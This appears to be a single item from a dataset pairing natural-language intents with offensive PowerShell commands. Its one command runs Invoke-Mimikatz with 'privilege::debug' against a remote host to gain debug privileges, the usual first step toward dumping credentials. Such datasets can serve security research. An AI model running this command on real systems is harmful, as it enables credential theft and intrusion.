# Natural language intent:
# Executes Mimikatz to obtain and debug privileges on a remote computer.

Invoke-Mimikatz -Command privilege::debug exit -ComputerName computer1
